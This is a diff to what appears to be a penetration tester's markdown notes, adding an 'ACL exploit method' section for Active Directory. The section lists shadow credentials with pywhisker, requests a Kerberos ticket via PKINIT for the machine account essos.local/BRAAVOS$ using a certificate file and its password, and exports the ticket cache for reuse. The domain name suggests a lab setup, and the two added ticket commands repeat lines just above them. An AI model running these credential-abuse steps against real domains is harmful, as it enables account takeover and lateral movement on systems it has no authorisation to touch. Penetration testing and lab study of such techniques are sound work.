@@ -66,3 +66,17 @@ python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy es
 ```bash
 export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
 ```
+
+### ACL exploit method
+
+```bash
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
+```
+
+```bash
+python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
+```
+
+```bash
+export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
+```
